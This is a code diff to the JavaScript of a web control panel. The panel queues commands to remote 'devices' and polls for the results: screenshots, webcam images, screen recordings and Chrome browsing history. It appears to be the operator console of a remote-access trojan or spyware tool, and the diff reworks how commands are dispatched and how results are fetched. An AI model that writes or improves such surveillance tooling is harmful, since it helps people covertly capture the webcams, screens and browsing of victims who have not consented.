@@ -960,30 +960,28 @@
 
             const output = document.getElementById('output');
             output.style.display = 'block';
-            output.innerHTML = '⏳ Executing command...';
+            output.innerHTML = '⏳ Sending command to device...';
 
-            const commandUrl = `/api/command/${command}`;
-            const payload = { device_id: selectedDevice };
-
-            fetch(commandUrl, {
+            fetch('/api/command/execute', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ device_id: selectedDevice, command })
             })
             .then(res => res.json())
             .then(data => {
-                if (data.status === 'success') {
-                    if (data.image) {
-                        output.innerHTML = `✅ Command executed successfully\n<img src="data:image/png;base64,${data.image}" style="max-width: 100%; margin-top: 3px; border-radius: 3px;">`;
-                    } else if (data.data) {
-                        output.innerHTML = '✅ ' + JSON.stringify(data.data, null, 2);
-                    } else if (data.history) {
-                        output.innerHTML = '✅ Chrome History:\n' + data.history.map(h => `${h.title}\n${h.url}`).join('\n\n');
+                if (data.status === 'success' || data.status === 'queued') {
+                    if (['screenshot', 'webcam'].includes(command)) {
+                        output.innerHTML = '🕒 Command queued. Waiting for media...';
+                        pollMedia(command, 10);
+                    } else if (command === 'chromehistory') {
+                        output.innerHTML = '🕒 Command queued. Waiting for history...';
+                        pollHistory(10);
                     } else {
-                        output.innerHTML = '✅ ' + (data.message || 'Command executed successfully');
+                        output.innerHTML = '🕒 Command queued. Waiting for result...';
+                        pollResult(command, 10);
                     }
                 } else {
-                    output.innerHTML = '❌ Error: ' + (data.message || 'Unknown error');
+                    output.innerHTML = '❌ Error: ' + (data.error || data.message || 'Unknown error');
                 }
             })
             .catch(err => {
@@ -991,21 +989,94 @@
             });
         }
 
+        function pollMedia(mediaType, attemptsLeft) {
+            const output = document.getElementById('output');
+            fetch(`/api/media/${selectedDevice}?type=${mediaType}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.image_base64) {
+                        const mime = mediaType === 'webcam' ? 'jpeg' : 'png';
+                        output.innerHTML = `✅ Media received\n<img src="data:image/${mime};base64,${data.image_base64}" style="max-width: 100%; margin-top: 3px; border-radius: 3px;">`;
+                        return;
+                    }
+                    if (attemptsLeft > 0) {
+                        setTimeout(() => pollMedia(mediaType, attemptsLeft - 1), 1500);
+                    } else {
+                        output.innerHTML = '⚠️ No media yet. Make sure the client is running.';
+                    }
+                })
+                .catch(() => {
+                    if (attemptsLeft > 0) {
+                        setTimeout(() => pollMedia(mediaType, attemptsLeft - 1), 1500);
+                    } else {
+                        output.innerHTML = '⚠️ Unable to load media.';
+                    }
+                });
+        }
+
+        function pollResult(command, attemptsLeft) {
+            const output = document.getElementById('output');
+            fetch(`/api/results/${selectedDevice}?command=${command}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.data) {
+                        const message = data.data.message || JSON.stringify(data.data);
+                        output.innerHTML = data.success ? `✅ ${message}` : `❌ ${message}`;
+                        return;
+                    }
+                    if (attemptsLeft > 0) {
+                        setTimeout(() => pollResult(command, attemptsLeft - 1), 1500);
+                    } else {
+                        output.innerHTML = '⚠️ No response yet. Ensure client is running.';
+                    }
+                })
+                .catch(() => {
+                    if (attemptsLeft > 0) {
+                        setTimeout(() => pollResult(command, attemptsLeft - 1), 1500);
+                    } else {
+                        output.innerHTML = '⚠️ Unable to load result.';
+                    }
+                });
+        }
+
+        function pollHistory(attemptsLeft) {
+            const output = document.getElementById('output');
+            fetch(`/api/history/${selectedDevice}`)
+                .then(res => res.json())
+                .then(history => {
+                    if (Array.isArray(history) && history.length > 0) {
+                        output.innerHTML = '✅ Chrome History:\n' + history.map(h => `${h.title || ''}\n${h.url || ''}`).join('\n\n');
+                        return;
+                    }
+                    if (attemptsLeft > 0) {
+                        setTimeout(() => pollHistory(attemptsLeft - 1), 1500);
+                    } else {
+                        output.innerHTML = '⚠️ No history yet. Ensure client is running.';
+                    }
+                })
+                .catch(() => {
+                    if (attemptsLeft > 0) {
+                        setTimeout(() => pollHistory(attemptsLeft - 1), 1500);
+                    } else {
+                        output.innerHTML = '⚠️ Unable to load history.';
+                    }
+                });
+        }
+
         function startRecording() {
             const duration = prompt('Enter recording duration in seconds:', '10');
             if (duration) {
-                fetch('/api/command/record', {
+                fetch('/api/command/execute', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ device_id: selectedDevice, duration: parseInt(duration) })
+                    body: JSON.stringify({ device_id: selectedDevice, command: 'record', params: { duration: parseInt(duration) } })
                 })
-                .then(res => res.blob())
-                .then(blob => {
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'screen_record.mp4';
-                    a.click();
+                .then(res => res.json())
+                .then(() => {
+                    const output = document.getElementById('output');
+                    output.style.display = 'block';
+                    output.innerHTML = '🕒 Record command queued. Waiting for client result...';
+                    pollResult('record', 10);
                 });
             }
         }
